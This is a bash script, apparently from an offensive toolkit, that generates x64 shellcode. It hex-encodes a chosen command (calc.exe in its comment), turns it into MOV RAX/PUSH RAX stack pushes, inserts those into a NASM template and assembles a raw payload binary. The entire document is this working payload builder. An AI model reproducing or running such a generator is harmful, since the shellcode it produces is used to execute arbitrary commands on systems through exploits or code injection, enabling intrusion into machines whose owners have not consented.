#!/usr/bin/bash

# $1: cmd to execute: calc.exe
# $2: shellcode source code path
# $3: shellcode name (from config.json)

P="`dirname \"$0\"`"

#echo "CMD: "$1

# calculate the length of the command
LEN=`echo $1 | tr -d "\n" | wc -c`
#echo "LEN: "$LEN

# reverse the command: little endien
REVERSE_CMD=`echo $1 | rev`
#echo "REV CMD: "$REVERSE_CMD
HEX_CMD=`echo $REVERSE_CMD | tr -d "\n" | xxd -p`
#echo "HEX CMD: "$HEX_CMD

# calculate number of byte
MODULO=`echo $(($LEN%8))`
#echo "MODULO: "$MODULO
DIVIDE=`echo $(($LEN/8))`
#echo "DIVIDE: "$DIVIDE

c="" # the command that will be written

# get the modulo byte and add space (20) if needed
h=""
if [ $MODULO -ne 0 ]; then
    k=$((8 - $MODULO))
    for i in `seq $k`; do 
        h+="20" # space
    done
    h+=${HEX_CMD:0:$MODULO*2}
    #echo $h
    c+="MOV RAX, 0x"$h"\n"
    c+="PUSH RAX\n"
fi
#echo $c

# get the next bytes
for (( i=0; i<$LEN*2; i+=16 )); do
    h="${HEX_CMD:$(($MODULO*2 + $i)):16}"
    #echo $h
    if [[ $h != "" ]]; then
        c+="MOV RAX, 0x"$h"\n"
        c+="PUSH RAX\n"
    fi
done
#echo $c

NAME_IN=$2
TMP_NAME="a.tmp"

echo "[*] Generating shellcode ..."

cp $NAME_IN $P/$TMP_NAME # make a copy of the original source code

sed -i "s/{{CMD}}/$c/g" $P/$TMP_NAME

nasm -f bin -o $P/a.bin $P/$TMP_NAME

rm $P/$TMP_NAME